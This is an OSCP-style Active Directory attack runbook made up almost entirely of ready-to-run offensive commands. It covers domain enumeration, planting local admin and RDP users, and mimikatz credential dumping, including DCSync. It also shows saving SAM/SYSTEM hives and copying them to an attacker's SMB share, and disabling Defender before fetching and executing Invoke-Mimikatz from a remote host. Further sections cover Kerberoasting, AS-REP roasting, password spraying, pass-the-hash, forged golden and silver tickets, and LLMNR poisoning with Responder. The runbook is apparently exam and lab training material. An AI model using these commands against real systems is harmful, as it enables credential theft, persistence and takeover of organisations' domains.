# OSCP Active Directory Enumeration

## Introduction
This runbook provides a comprehensive guide to Active Directory enumeration. It includes a variety of techniques and tools for discovering and exploiting Active Directory configurations.

## Table of Contents
- [OSCP Active Directory Enumeration](#oscp-active-directory-enumeration)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [Enumeration](#enumeration)
    - [Enumerating Users](#enumerating-users)
    - [Enumerating Groups](#enumerating-groups)
    - [Domain Information](#domain-information)
    - [PowerView Module](#powerview-module)
    - [Last Logon](#last-logon)
    - [List Computers](#list-computers)
    - [Add Domain User to a Domain Group](#add-domain-user-to-a-domain-group)
    - [Enumeration Script for All AD Users](#enumeration-script-for-all-ad-users)
    - [Access](#access)
    - [Enumeration Through Service Principal Names](#enumeration-through-service-principal-names)
  - [Enumeration - BloodHound](#enumeration---bloodhound)
  - [Remote Access](#remote-access)
    - [Remote Desktop Protocol - RDP](#remote-desktop-protocol---rdp)
      - [RDP from terminal](#rdp-from-terminal)
      - [evil-winrm](#evil-winrm)
  - [Exploitation](#exploitation)
    - [Cached Credential Storage and Retrieval](#cached-credential-storage-and-retrieval)
    - [Extracting hashes](#extracting-hashes)
      - [Intro](#intro)
    - [Get sam and system by registry (From old versions to recent versions)](#get-sam-and-system-by-registry-from-old-versions-to-recent-versions)
    - [Volume shadow copy (Windows Server \\ recent versions)](#volume-shadow-copy-windows-server--recent-versions)
    - [Extracting Hashes in Domain and Pivoting](#extracting-hashes-in-domain-and-pivoting)
    - [Extracting Hashes in cache](#extracting-hashes-in-cache)
    - [Extracting Hashes (Remote)](#extracting-hashes-remote)
    - [AS-REP Roasting Attack - not require Pre-Authentication](#as-rep-roasting-attack---not-require-pre-authentication)
    - [Kerberoast](#kerberoast)
  - [Service Account Attacks](#service-account-attacks)
  - [Password Spraying](#password-spraying)
  - [Active Directory Lateral Movement](#active-directory-lateral-movement)
    - [Pass the Hash](#pass-the-hash)
    - [Over Pass the Hash](#over-pass-the-hash)
    - [Silver Ticket - Pass the Ticket](#silver-ticket---pass-the-ticket)
    - [Golden Ticket - Pass the Ticket](#golden-ticket---pass-the-ticket)
    - [DCSync Attack](#dcsync-attack)
    - [NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder](#netntlm-authentication-exploits-with-smb---llmnr-poisoning---capturing-hash-in-responder)

## Enumeration

### Enumerating Users
  Enumerate all users in the entire domain
```sh
net user /domain
```
  Get information from a specific user
```sh
net user <user> /domain
```
  Enumerate logged users
```sh
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName <computer_name>
```
  Enumerate all active sessions
```
Get-NetSession -ComputerName dc1
```

### Enumerating Groups
  Enumerate all groups in the entire domain
```sh
net group /domain
```
  Get members of local group
```sh
Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
```

### Domain Information
  Find out domain controller hostname
```sh
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### PowerView Module

 Configure ActiveDirectory Module - RSAT
```
curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  
curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  
Import-Module .\Microsoft.ActiveDirectory.Management.dll  
Import-Module .\ActiveDirectory.psd1  
```
  Powerview
```sh
curl https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 -o PowerView.ps1
. .\PowerView.ps1
```

### Last Logon
```sh
Get-LastLoggedOn -ComputerName <domain>
```

### List Computers
```sh
Get-NetComputer (PowerView)
```

### Add Domain User to a Domain Group
```sh
Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
Get-NetGroupMember -GroupName 'SQLManagers'
```

### Enumeration Script for All AD Users
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Results = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```

### Access

  Validation of network user credentials via smb using crackmmapexec  
```
crackmapexec smb <IP> -u <user> -H <hash> -d <domain> --continue-on-success
crackmapexec smb <IP> -u <user> -H <hash> > -d <domain> 
crackmapexec smb <IP> -u <user> -H <hash> -H <hash> --local-auth --lsa  
crackmapexec smb <IP> -u <user> -p <password>
```

  Connect via smbclient
```
smbclient //ip -U <user> -L
```
  smbmap
```
smbmap -H <ip> -u <user> 
```
  Permission of given user on smb shares
```
crackmapexec smb <IP> --shares -u <user> -p '<pass>'
```

### Enumeration Through Service Principal Names
https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1

## Enumeration - BloodHound
kali
```sh
start neo4j - http://localhost:7474/
```
sudo neo4j start
```
 Enumeration - Windows
``` powershell
iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All,loggedon
Invoke-BloodHound -CollectionMethod All -Verbose
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
```



## Remote Access

### Remote Desktop Protocol - RDP

  Create a user  
```cmd
net user <user> <password> /add
```
  Add to local administrators group  
```cmd
net localgroup Administrators <user> /add
```
  Add to group of users who can access via RDP
```cmd
net localgroup "Remote Management Users" <user> /add
net localgroup "Remote Desktop Users" <user> /add
```
  Enable RDP
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
  Move to another user  
```cmd
runas /user:<hostname>\<user> cmd
```

#### RDP from terminal
  xfreerdp via RDP with sharing in \\\tsclient\share\
```
xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /drive:/usr/share/windows-resources,share
```
  rdesktop via RDP  
```
rdesktop -u <user> -p <password> -d <domain> -f <ip>
```

#### evil-winrm
```
evil-winrm -i <ip> -u <user> -p <password>
```

## Exploitation

### Cached Credential Storage and Retrieval
```
./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
```

### Extracting hashes
#### Intro
SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system

### Get sam and system by registry (From old versions to recent versions)
```cmd win
reg save hklm\sam <ip>.sam
reg save hklm\system <ip>.system
```
  transfer .sam and .system by SMB
```sh 
# kali
impacket-smbserver share . -smb2support -user user -password test123
```
```cmd
# windows
net use \\<smbserver>\share /USER:user test123
copy C:\Users\Backup\sam.hive \\<smbserver>\share\
copy C:\Users\Backup\system.hive \\<smbserver>\share\
```
  View smb enumeration  
```
net view \\dc /all
net use * \\dc\c$
net use
```

### Volume shadow copy (Windows Server \ recent versions)
  vssadmin  
```
vssadmin create shadow /for=c:
```
  meterpreter  
```
hashdump
```
  samdump2 (Win 2k/NT/XP/Vista SAM)   
```
samdump2 system sam
```
  impacket-secretsdump  
```
impacket-secretsdump -sam sam -system system LOCAL
```

### Extracting Hashes in Domain and Pivoting  
  Dump the credentials of all connected users, including cached hashes
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
-> mimikatz + ScriptBlock
```
$sess = New-PSSession -ComputerName <hostname>
```
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
iex (iwr http://<ip>/Invoke-Mimikatz.ps1 -UseBasicParsing)
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```
or  
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
Invoke-Mimikatz
```

### Extracting Hashes in cache
  fgdump  -> /usr/share/windows-binaries/fgdump/fgdump.exe
```
fgdump.exe
```
 meterpreter  
```
load kiwi
creds_msv
```
  wce-universal (Clear Text password)  -> /usr/share/windows-resources/wce/wce-universal.exe
```
wce-universal.exe -w
```
 mimikatz
```
.\mimikatz.exe
sekurlsa::wdigest -a full  
sekurlsa::logonpasswords
```
mimikatz - meterpreter  
```
load mimikatz  
wdigest
```

### Extracting Hashes (Remote)
```sh
impacket-secretsdump <user>:<password>@<IP>
```

### AS-REP Roasting Attack - not require Pre-Authentication
  kerbrute - Enumeration Users
```sh
kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
```
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

   GetNPUsers.py - Query ASReproastable accounts from the KDC
```sh
impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
```

### Kerberoast
  impacket-GetUserSPNs
```
impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
```
or  
```
impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
```
```
hashcat -a 0 -m 13100 <hash> /usr/share/wordlists/rockyou.txt 
```
```
.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
```
or  
```
runas /user:<hostname>\<user> cmd.exe
```



## Service Account Attacks
  Some user tickets that are stored in memory
  Display all cached Kerberos tickets for the current user
```
./mimikatz.exe "sekurlsa::tickets"
```
 Export service tickets from memory
```
./mimikatz.exe "kerberos::list /export"
```
Wordlist Attack with tgsrepcrack.py to get the clear text password for the service account
```
# sudo apt update && sudo apt install kerberoast
# Note: Install 
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket.kirbi>
```
or  
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

## Password Spraying
```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```
https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1


## Active Directory Lateral Movement
### Pass the Hash
  Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
```sh
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
```
  Remote Access - impacket-psexec  
```sh
impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
impacket-psexec '<domain>/<user>'@<IP>
```
  Remote Access + evil-winrm  
```sh
evil-winrm -i <IP> -u <user> -H <hash>
```

### Over Pass the Hash
Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
```cmd
mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm.hash> /run:PowerShell.exe" "exit"
```
   Command execution with psexec  
``` cmd
.\PsExec.exe \\<hostname> cmd.exe
```

### Silver Ticket - Pass the Ticket
It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
  Get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```
  Get Machine Account Hash
```
Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
``` 
 - Exploitation
``` mimikatz
kerberos::purge
kerberos::list
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
```
or
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
kerberos::list
```

### Golden Ticket - Pass the Ticket
It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
  Get hash krbtgt
```
./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
```
  Get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```
- Exploitation
``` mimikatz
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
misc::cmd

psexec.exe \\dc1 cmd.exe
```

### DCSync Attack
-> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
```
./mimikatz.exe "lsadump::dcsync /user:Administrator"
```

### NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder
Responder allows you to perform Man-in-the-Middle attacks by poisoning responses during NetNTLM authentication, making the client talk to you instead of the real server it wants to connect to.
On a real lan network, the responder will attempt to poison all Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Server (NBT-NS), and Web Proxy Auto-Dscovery (WPAD) requests detected. NBT-NS is the precursor protocol to LLMNR.
```
responder -I eth0 -v
```
